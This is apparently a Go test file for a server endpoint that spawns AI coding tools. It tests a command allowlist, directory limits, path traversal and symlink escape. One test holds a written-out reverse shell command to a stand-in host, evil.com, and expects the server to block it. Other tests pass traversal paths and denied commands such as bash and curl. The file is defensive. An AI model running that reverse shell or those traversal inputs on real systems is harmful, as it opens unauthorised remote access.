package main

import (
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAllowlist_CommandNotAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed command 'bash': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_CommandAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("allowed command 'claude' was rejected: %s", w.Body.String())
	}
}

func TestAllowlist_DirectoryNotAllowed(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/etc")
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed directory '/etc': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_TraversalBlocked(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp/../etc")
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("directory traversal should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_ReverseShellBlocked(t *testing.T) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("reverse shell command should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_SpawnDisabledWithoutConfig(t *testing.T) {
	savedConfig := config
	config = nil
	defer func() { config = savedConfig }()

	mux := http.NewServeMux()
	mux.HandleFunc("/", handleIndex)
	mux.HandleFunc("/spawn", handleSpawn)
	handler := newCSRFHandler(mux)

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude")

	w := postWithCSRF(t, handler, "/spawn", form)

	if w.Code != http.StatusForbidden {
		t.Errorf("spawn without config should be blocked: got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' message, got: %s", w.Body.String())
	}
}

func TestIsCommandAllowed(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"claude", true},
		{"codex", true},
		{"echo", true},
		{"bash", false},
		{"sh", false},
		{"rm", false},
		{"curl", false},
		{"", false},
	}

	for _, tc := range tests {
		result := isCommandAllowed(tc.cmd)
		if result != tc.expected {
			t.Errorf("isCommandAllowed(%q) = %v, want %v", tc.cmd, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed(t *testing.T) {
	tmpDir := t.TempDir()
	subDir := filepath.Join(tmpDir, "subdir")
	os.MkdirAll(subDir, 0755)

	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"claude", "codex", "echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	tests := []struct {
		dir      string
		expected bool
	}{
		{tmpDir, true},
		{subDir, true},
		{"/etc", false},
		{"/", false},
		{tmpDir + "/../etc", false},
	}

	for _, tc := range tests {
		result := isDirectoryAllowed(tc.dir)
		if result != tc.expected {
			t.Errorf("isDirectoryAllowed(%q) = %v, want %v", tc.dir, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed_SymlinkBypass(t *testing.T) {
	tmpDir := t.TempDir()
	outsideDir := t.TempDir()

	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	symlink := filepath.Join(tmpDir, "escape")
	if err := os.Symlink(outsideDir, symlink); err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	if isDirectoryAllowed(symlink) {
		t.Errorf("symlink %q -> %q should be rejected", symlink, outsideDir)
	}

	if !isDirectoryAllowed(tmpDir) {
		t.Errorf("allowed directory %q should be accepted", tmpDir)
	}
}
